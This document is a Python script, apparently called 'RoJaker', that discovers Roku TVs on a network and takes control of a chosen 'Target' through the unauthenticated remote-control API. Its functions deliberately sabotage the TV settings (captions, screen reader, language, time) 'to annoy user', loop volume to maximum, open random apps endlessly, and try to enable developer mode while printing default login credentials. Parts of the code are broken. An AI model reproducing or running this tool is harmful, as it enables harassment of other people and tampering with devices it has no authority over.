# Made By James Ryan Wood



# import module checker

import importlib.util



roku_installed = importlib.util.find_spec("roku") is not None

colorama_installed = importlib.util.find_spec("colorama") is not None



if not roku_installed or not colorama_installed:

    print("[ERROR] requirements not installed")

    request = input("Install them? Y or N > ")

    print()

    if request.upper() == "Y":

        if not roku_installed:

            try:

                import pip

                pip.main(["install", "roku"])

                print("[SUCCESS] roku installed!")

            except ImportError:

                print("[ERROR] pip is not installed. Please install it manually.")

        if not colorama_installed:

            try:

                import pip

                pip.main(["install", "colorama"])

                print("[SUCCESS] colorama installed!")
                os.system("python3 config.py")

            except ImportError:

                print("[ERROR] pip is not installed. Please install it manually.")

    else:

        print("[EXITING] Requirements not installed...")

        exit()



# imports

import os

from roku import Roku

import colorama

from colorama import Fore, Back, Style, init

import sys

import socket

import struct

import time

import requests

import random



def print_text_from_pastebin():

    """

    Function to print the text content from a given Pastebin link.



    Parameters:

    - pastebin_link: str

        The link to the Pastebin containing the text to be printed.



    Raises:

    - Exception:

        Raises an exception if there is an issue accessing the Pastebin link or retrieving the text content.

    """



    try:

        # Sending a GET request to the Pastebin link to retrieve the text content

        response = requests.get(pastebin_link)



        # Checking if the request was successful (status code 200)

        if response.status_code == 200:

            # Printing the text content from the Pastebin link

            print(response.text)

        else:

            # Handling unsuccessful request

            raise Exception(f"Failed to retrieve text content. Status Code: {response.status_code}")



    except Exception as e:

        # Handling any exceptions that might occur during the process

        print(f"An error occurred: {e}")



# Example of using the function to print text from a Pastebin link

pastebin_link = "https://pastebin.com/raw/ZXKCHMPG"

print_text_from_pastebin()



def check_for_update():

    pastebin_link = "https://pastebin.com/raw/Fg1HgGhX"

    response = requests.get(pastebin_link)

    if response.status_code == 200:

        pastebin_number = int(response.text.strip())



        current_script_number = 6



        if pastebin_number > current_script_number:

            print("["+Fore.RED+ "UPDATE"+Fore.WHITE+"]"+" is available!")

            print_text_from_pastebin()

        else:

            print("["+Fore.GREEN+ "No Update"+Fore.WHITE+"]"+" is available!")

    else:

        print("Failed to retrieve data from Pastebin. Please check the link.")

# IP Input

os.system("clear")

check_for_update()

file_path = "chosen_color.txt"

init(autoreset=False) 

with open(file_path, 'r') as file:

    c_clr = file.read()

print(getattr(Fore, c_clr.upper(),) + "scanning...")



roku_devices = Roku.discover(timeout=10)

print("M. Manual Input IP")

for i, device in enumerate(roku_devices):

    print(f"{i+1}. {device}")

selected_index = input("Select A Option:  ")



if selected_index.lower() == "m":  

    selected_device = input("Enter IP address: ")

else:

    selected_index = int(selected_index) - 1

    if selected_index < 0 or selected_index >= len(roku_devices):

        print("Invalid selection")

        exit()

    else:

        selected_device = roku_devices[selected_index].host  



# Menu

def main():

    os.system("clear")

    print("      _______________ ")

    print("     | /~~~~~~~~\ |||| ")

    print("     ||  fuck    |...| ")

    print("     || dem tvs  |   | ")

    print("     | \________/  O | ")

    print("      _______________ ")

    print()

    border = "|---------------------------|"

    formatted_device = selected_device.center(len(border) - 12)

    print(border)

    print('| Made By: RE70-DECEMBER    |')

    print(border)

    print("| Version:     1.06         |")

    print(border)

    print("| Target: {} |".format(formatted_device))

    print(border)

    print()

    print("1. Get Info\n2. See Current Running App\n3. Dump Apps\n4. Remote\n5. Run An App\n6. Power off or on TV\n7. Volume Loop\n8. Other Things\nq. Exit")

    print()

    menu = input("(Menu) --> ")

    return menu

#NEEDS WORK WILL DO AS SOON AS POSSIBLE
def enable_dev():
    print("Enabling developer Menu!")
    roku = Roku(selected_device)
    roku.home()
    time.sleep(1)
    roku.home()
    time.sleep(1)
    roku.home()
    time.sleep(1)
    roku._post('/keypress/Up')
    time.sleep(1)
    roku._post('/keypress/Up')
    time.sleep(1)
    roku._post('/keypress/Right')
    time.sleep(1)
    roku._post('/keypress/Left')
    time.sleep(1)
    roku._post('/keypress/Right')
    time.sleep(1)
    roku._post('/keypress/Left')
    time.sleep(1)
    roku._post('/keypress/Right')
    time.sleep(1)
    roku._post('/keypress/Left')
    time.sleep(1)
    roku._post('/keypress/Right')
    time.slee(1)
    roku._post('/keypress/Left')
    time.sleep(1)
    roku._post('/keypress/Right')
    time.sleep(1)
    roku._post('/keypress/Left')
    time.sleep(1)
    roku._post('/keypress/Right')

    print("Developed Mode enabled\nTv Will Restart")
    print("wait 30 seconds then goto")
    print("http://"+selected_device+":80")
    print("Login Set To\nUsername: rokudev\npassword: abcd")
    input("click enter to return")
    main()



def other_menu():
    print("Here is your Options\n1. Enable Roku developer menu\n2. Check for roku developer menu\n3. Fix vulnerability\n4. Fuck TV \n5. Spam Open Random Apps\n6.Back to rojaker Menu")
    other_menu_input = input("menu --> ")
    if other_menu_input == "1":
        dev_menu_check()
    elif other_menu_input == "2":
        dev_check_check_check()
    elif other_menu_input == "3":
        fix_vuln_menu()
    elif other_menu_input == "4":
        fuck_tv_menu()
    elif other_menu_input == "5":
        spam_app()
    elif other_menu_input == "6":
        main()


def fuck_tv_menu():
    print("Warning this will change a lot of tv settings to annoy user\n1. Fuck Tv\n2. UnFuck Tv\n3. GoBack")
    fuck = input("Pick Your Fucking Option --> ")
    if fuck == "1":
        fuck_tv()
    elif fuck == "2":
        unfuck_tv()
    elif fuck == "3":
        other_menu()


def unfuck_tv():
    print("work in progress!")

def fuck_tv():
    roku = Roku(selected_device)
    #Settings Path
    print("Going To Tv Settings...")
    time.sleep(2)
    print("10%")
    roku.home()
    time.sleep(2)
    print("20%")
    roku.home()
    time.sleep(2)
    print("30%")
    roku.home()
    print("40%")
    roku._post('/keypress/Down')
    print("50%")
    roku._post('/keypress/Down')
    print("60%")
    roku._post('/keypress/Down')
    print("70%")
    roku._post('/keypress/Down')
    print("80%")
    roku._post('/keypress/Down')
    print("90%")
    roku._post('/keypress/Down')
    print("100%")
    roku._post('/keypress/Down')
    roku._post('/keypress/Right')
    print("Now in settings!")
    #Accessability settings path
    print("Going To Acessibility")
    print("20%")
    roku._post('/keypress/Down')
    print("40%")
    roku._post('/keypress/Down')
    print("60%")
    roku._post('/keypress/Down')
    print("80%")
    roku._post('/keypress/Down')
    roku._post('/keypress/Right')
    print("100%")
    print("Now in Acessibility Settings!")
    #Change Captions mode in the accesability path (Command 1 done)
    print("Changing caption settings...")
    roku._post('/keypress/Right')
    roku._post('/keypress/Down')
    roku._post('/keypress/Select')
    roku._post('/keypress/Left')
    #Change captions perffered lanquage in the accessability settings (command 2 done )
    print("Changing Caption Lanquage...")
    roku._post('/keypress/Down')
    roku._post('/keypress/Right')
    roku._post('/keypress/Down')
    roku._post('/keypress/Down')
    roku._post('/keypress/Select')
    roku._post('/keypress/Left')
    #Change Caption Style Menu  In The Accessiblity Settings 
    roku._post('/keypress/Down')
    roku._post('/keypress/Right')
    #Change Text style in the caption style menu in the acessibiltiy settings
    print("Chaning Caption Style...")
    roku._post('/keypress/Right')
    roku._post('/keypress/Up')
    roku._post('/keypress/Select')
    roku._post('/keypress/Left')
    #Text Edge Effecting
    print("Changing Text Edging Effect...")
    roku._post('/keypress/Down')
    roku._post('/keypress/Right')
    roku._post('/keypress/Up')
    roku._post('/keypress/Up')
    roku._post('/keypress/Up')
    roku._post('/keypress/Select')
    roku._post('/keypress/Left')
    #Change Text Size
    print("Changing Caption Text...")
    roku._post('/keypress/Down')
    roku._post('/keypress/Right')
    roku._post('/keypress/Down')
    roku._post('/keypress/Select')
    roku._post('/keypress/Left')
    #Change Text Color
    print("Changing Caption Color...")
    roku._post('/keypress/Down')
    roku._post('/keypress/Right')
    roku._post('/keypress/Up')
    roku._post('/keypress/Up')
    roku._post('/keypress/Up')
    roku._post('/keypress/Select')
    roku._post('/keypress/Left')
    #Change caption background color
    print("changing caption background color...")
    roku._post('/keypress/Down')
    roku._post('/keypress/Down')
    roku._post('/keypress/Right')
    roku._post('/keypress/Down')
    roku._post('/keypress/Down')
    roku._post('/keypress/Down')
    roku._post('/keypress/Down')
    roku._post('/keypress/Down')
    roku._post('/keypress/Select')
    roku._post('/keypress/Left')
    #Change window color 
    print("changing window color...")
    roku._post('/keypress/Down')
    roku._post('/keypress/Down')
    roku._post('/keypress/Right')
    roku._post('/keypress/Up')
    roku._post('/keypress/Up')
    roku._post('/keypress/Select')
    roku._post('/keypress/Left')
    #Change window capactiy
    print("changing window capacity...")
    roku._post('/keypress/Down')
    roku._post('/keypress/Right')
    roku._post('/keypress/Up')
    roku._post('/keypress/Select')
    roku._post('/keypress/Left')
    #Go Back to accessability Menu
    roku._post('/keypress/Left')
    #Enable Screen Reader
    print("Screen Reader Enabled...")
    roku._post('/keypress/Down')
    roku._post('/keypress/Right')
    roku._post('/keypress/Select')
    roku._post('/keypress/Left')
    #Screen Reader speech rate
    print("changing speech rate...")
    roku._post('/keypress/Down')
    roku._post('/keypress/Right')
    roku._post('/keypress/Down')
    roku._post('/keypress/Down')
    roku._post('/keypress/Select')
    roku._post('/keypress/Left')
    #Screen reader speech tone 
    print("changing speech tone...")
    roku._post('/keypress/Down')
    roku._post('/keypress/Down')
    roku._post('/keypress/Right')
    roku._post('/keypress/Down')
    roku._post('/keypress/Down')
    roku._post('/keypress/Down')
    roku._post('/keypress/Select')
    roku._post('/keypress/Left')
    #Disable text to speech shortcut
    print("Text to speech shortcut disabled...")
    roku._post('/keypress/Down')
    roku._post('/keypress/Right')
    roku._post('/keypress/Down')
    roku._post('/keypress/Select')
    roku._post('/keypress/Left')
    #Exiting accessibility menu!
    roku._post('/keypress/Left')
    #Changing audio lanquage
    print("changing audio lanquage...")
    roku._post('/keypress/Down')
    roku._post('/keypress/Right')
    roku._post('/keypress/Down')
    roku._post('/keypress/Down')
    roku._post('/keypress/Right')
    roku._post('/keypress/Up')
    roku._post('/keypress/Up')
    roku._post('/keypress/Up')
    roku._post('/keypress/Select')
    roku._post('/keypress/Left')
    roku._post('/keypress/Left')

    #Going to privacy settings 
    print("Going to privacy settings...")
    roku._post('/keypress/Down')
    roku._post('/keypress/Down')
    roku._post('/keypress/Down')
    roku._post('/keypress/Down')
    roku._post('/keypress/Down')
    roku._post('/keypress/Down')
    roku._post('/keypress/Down')
    roku._post('/keypress/Right')
    #Advertising 
    print("Restriciting Advertiments...")
    roku._post('/keypress/Right')
    roku._post('/keypress/Right')
    roku._post('/keypress/Select')
    roku._post('/keypress/Down')
    roku._post('/keypress/Select')
    roku._post('/keypress/Down')
    roku._post('/keypress/Select')
    roku._post('/keypress/Down')
    roku._post('/keypress/Down')
    roku._post('/keypress/Down')
    roku._post('/keypress/Down')
    roku._post('/keypress/Select')
    roku._post('/keypress/Left')
    roku._post('/keypress/Left')
    roku._post('/keypress/Left')
    #Exiting accessibility menu and goto system settings 
    print("Going to system settings...")
    roku._post('/keypress/Down')
    roku._post('/keypress/Down')
    roku._post('/keypress/Right')
    #Changing tv Time
    print("Changing Tv Time...")
    roku._post('/keypress/Down')
    roku._post('/keypress/Down')
    roku._post('/keypress/Right')
    roku._post('/keypress/Right')
    time.sleep(3)
    roku._post('/keypress/Down')
    roku._post('/keypress/Right')
    roku._post('/keypress/Right')
    roku._post('/keypress/Down')
    roku._post('/keypress/Down')
    roku._post('/keypress/Down')
    roku._post('/keypress/Down')
    roku._post('/keypress/Select')
    roku._post('/keypress/Left')
    roku._post('/keypress/Left')
    roku._post('/keypress/Left')
    #Change tv lanquage
    print("Selecting Tv Lanquage...")
    roku._post('/keypress/Down')
    roku._post('/keypress/Down')
    roku._post('/keypress/Right')
    roku._post('/keypress/Up')
    roku._post('/keypress/Up')
    roku._post('/keypress/Select')
    print("changing lanquage please wait 44 seconds\nDont Close Script!\nrokus are slow sorry")
    time.sleep(44)
    print("Language Changed...")
    print("Making tv go back to home!")
    roku.home()
    roku.home()
    roku.home()
    input("!!!!lick enter continue!!!!")
    app_spam_menu()


def app_spam_menu():
    print("1. Loop spam Random Apps\n2. Open 1 single app\n3. GoBack To Menu")
    spam_input = input("FUCK TV LAST STEP --> ")
    if spam_input == "1":
        spam_app()
    elif spam_input == "2":
        open_app()
    elif spam_input == "3":
        other_menu()
    

def open_app():
    roku = Roku(selected_device)  
    apps = roku.apps
    app_ids = [app.id for app in apps]
    random_app_id = random.choice(app_ids)
    test = roku[random_app_id]
    print("Launched: "+random_app_id)
    test.launch()
    input("click enter to return to menu")
    other_menu()



def spam_app():
    roku = Roku(selected_device)  
    apps = roku.apps
    app_ids = [app.id for app in apps]
    print("Seconds on how fast the apps are gonna open\nRecommened: 30") 
    num = (int(input("timeout: ")))
    while True:
        random_app_id = random.choice(app_ids)
        test = roku[random_app_id]
        time.sleep(num)
        print("Launched: "+random_app_id)
        test.launch()



    



def fix_vuln_menu():
    print("Warning this will fix this tv from this script working\nYou will lose connection tv will be fine tho\n1. warn tv and fix vuln\n2. dont warn tv fix vuln\n3. goback")
    fix_menu_input = input("VULN FIXER ROKU --> ")
    if fix_menu_input == "1":
        fix_vuln_warn()
    elif fix_menu_input == "2":
        fix_vuln()
    elif fix_menu_input == "3":
        other_menu()

def fix_vuln_warn():
    print("Warnining user!")
    time.sleep(3)
    roku = Roku(selected_device)
    print("10%")
    roku.home()
    time.sleep(2)
    print("20%")
    roku.home()
    time.sleep(2)
    print("30%")
    roku.home()
    time.sleep(2)
    print("40%")
    roku._post('/keypress/Down')
    print("50%")
    roku._post('/keypress/Down')
    roku._post('/keypress/Down')
    print("60%")
    roku._post('/keypress/Down')
    print("70%")
    roku._post('/keypress/Down')
    print("80%")
    roku._post('/keypress/Down')
    print("90%")
    roku._post('/keypress/Right')
    print("100%")
    print("Typing Now On Tv!")
    roku.literal('Fixing Vulnurbility')
    print("Wait 8 seconds...")
    print("8")
    time.sleep(1)
    print("7")
    time.sleep(1)
    print("6")
    time.sleep(1)
    print("5")
    time.sleep(1)
    print("4")
    time.sleep(1)
    print("3")
    time.sleep(1)
    print("2")
    time.sleep(1)
    print("1")
    fix_vuln()


def fix_vuln():
    print("Fixing vulnuribiity\n wait until script fails!")
    print("Launching in 3 seconds...")
    time.sleep(1)
    print("3")
    time.sleep(1)
    print("2")
    time.sleep(1)
    print("Launched!")
    while True: 
        roku = Roku(selected_device)
        print("0%")
        roku.home()
        time.sleep(1)
        roku.home()
        time.sleep(1)
        roku.home()
        roku._post('/keypress/Down')
        roku._post('/keypress/Down')
        roku._post('/keypress/Down')
        roku._post('/keypress/Down')
        roku._post('/keypress/Down')
        print("25%")        
        roku._post('/keypress/Down')
        roku._post('/keypress/Down')
        roku._post('/keypress/Right')
        roku._post('/keypress/Down')
        roku._post('/keypress/Down')
        roku._post('/keypress/Down')
        roku._post('/keypress/Down')
        roku._post('/keypress/Down')
        roku._post('/keypress/Down')
        roku._post('/keypress/Down')
        print("50%")
        roku._post('/keypress/Down')
        roku._post('/keypress/Down')
        roku._post('/keypress/Down')
        roku._post('/keypress/Down')
        roku._post('/keypress/Down')
        roku._post('/keypress/Down')
        roku._post('/keypress/Right')
        roku._post('/keypress/Down')
        roku._post('/keypress/Down')
        roku._post('/keypress/Down')
        roku._post('/keypress/Down')
        print("75%")
        roku._post('/keypress/Down')
        roku._post('/keypress/Down')
        roku._post('/keypress/Down')
        roku._post('/keypress/Down')
        roku._post('/keypress/Right')
        roku._post('/keypress/Down')
        roku._post('/keypress/Down')
        roku._post('/keypress/Down')
        roku._post('/keypress/Right')
        roku._post('/keypress/Right')
        print("100%\nFinishing...")
        roku._post('/keypress/Down')
        roku._post('/keypress/Down')
        roku._post('/keypress/Select')
        

def dev_check_check_check():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    result = sock.connect_ex((selected_device,80))
    if result == 0:
        print("Developer Mode Detected!")
        input("click enter to return to menu")
        other_menu()
    else:
            print("No Developer Mode Detected! ")
            sock.close()
            input("click enter Return To menu")
            other_menu()

#WORKING!!!!!!
def dev_menu_check():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    result = sock.connect_ex((selected_device,80))
    if result == 0:
        print("Developer Mode Already Detected!")
        print("Goto Browser and type to access it")
        print("http://"+selected_device+":80")
        print("Dont know login\nUsername: rokudev\npassword: ????")
        input("click enter to return to menu")
        main()
    else:
            print("No Developer Mode Detected! ")
            sock.close()
            input("click enter To Enable menu")
            enable_dev()


def vol_up_menu():
    roku = Roku(selected_device)
    while True:
        roku._post('/keypress/VolumeUp')

def vol_down_menu():
    roku = Roku(selected_device)
    while True:
        roku._post('/keypress/VolumeDown')
        


def vol_menu():
    print("Turn The volume all the way up or down")
    print("1.Up\n2.Down")
    u = input("Volume > ")
    if u == "1":
        vol_up_menu()
    elif u == "2":
        vol_down_menu()



def remote_menu():

    os.system("clear")



    os.system("figlet -f slant RoJaker")



    border = "|---------------------------|"

    formatted_device = selected_device.center(len(border) - 12)

    print(border)

    print('| Made By: RE70-DECEMBER    |')

    print(border)

    print("| Version:        4         |")

    print(border)

    print("| Target: {} |".format(formatted_device))

    print(border)

    print()

    print("1. Up\n2. Down\n3. Right\n4. Left\n5. Select\n6. Back\n7. Replay\n8. Home menu\n9. Return to RoJaker")

    print()

    rem = input("(Remote) --> ")

    

    if rem == "1":

      roku = Roku(selected_device)

      roku._post('/keypress/Up')

      remote_menu() 

        	

    elif rem == "2":

      roku = Roku(selected_device)

      roku._post('/keypress/Down')

      remote_menu()

      

    elif rem == "3":

      roku = Roku(selected_device)

      roku._post('/keypress/Right')

      remote_menu()

    elif rem == "4":

      roku = Roku(selected_device)

      roku._post('/keypress/Left')

      remote_menu()

    elif rem == "5": 

      roku = Roku(selected_device)

      roku._post('/keypress/Select')

      remote_menu()

    elif rem == "6":

      roku = Roku(selected_device)

      roku._post('/keypress/Back')

      remote_menu()

    elif rem == "7": 

      roku = Roku(selected_device)

      roku._post('/keypress/Replay')

      remote_menu()

    elif rem == "8":

      roku = Roku(selected_device)

      roku.home()

      remote_menu()

    elif rem == "9":

      main()





while True:

    menu = main()

    if menu == "1":

        roku = Roku(selected_device)

        colorama.init()

        print(roku.info)

        input("Press enter to return to menu")

    elif menu == "2":

        roku = Roku(selected_device)

        print(roku.active_app)

        input("Press enter to return to menu")

    elif menu == "3":

        roku = Roku(selected_device)

        print(roku.apps)

        input("Press enter to return to menu")

    elif menu == "4":

        remote_menu()

    elif menu == "5":

    	roku = Roku(selected_device)

    	user_run = input("Enter A App ID: ")

    	test = roku[user_run]

    	test.launch()

    elif menu == "6":

    	roku = Roku(selected_device)

    	roku._post('/keypress/Power')

    	print("[*]TV Powered Off or On")

    	input("Press enter to return to menu")

    elif menu == "7": 
        vol_menu()

    elif menu == "8":
        other_menu()

    elif menu == "c":
        os.system("python3 config.py")

    elif menu == "q":

    	exit()




